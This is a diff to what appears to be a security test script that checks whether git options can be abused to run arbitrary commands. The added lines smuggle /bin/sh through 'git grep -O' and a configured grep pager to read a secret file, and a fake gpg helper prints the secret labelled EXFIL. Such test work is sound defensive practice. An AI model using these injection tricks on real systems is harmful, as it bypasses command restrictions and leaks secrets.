@@ -119,6 +119,16 @@ execFileSync('git', ['remote', 'set-url', 'origin', `ext::${extScript}`], { cwd:
 console.log('== ext remote helper');
 run('git remote show origin');
 
+const pagerTarget = join(root, 'pager-target');
+writeFileSync(pagerTarget, `cat "${secret}"\n`);
+execFileSync('git', ['add', 'pager-target'], { cwd: root });
+console.log('== clustered grep pager');
+run('git grep -nO/bin/sh cat');
+execFileSync('git', ['config', 'pager.grep', filterScript], { cwd: root });
+console.log('== configured grep pager');
+run('git grep -nO cat');
+execFileSync('git', ['config', '--unset-all', 'pager.grep'], { cwd: root });
+
 const gpgScript = join(root, 'gpg-helper.sh');
 writeFileSync(gpgScript, `#!/bin/sh\necho EXFIL:$(cat "${secret}") >&2\nprintf '%s\\n' '-----BEGIN PGP SIGNATURE-----' 'fake' '-----END PGP SIGNATURE-----'\n`);
 chmodSync(gpgScript, 0o755);
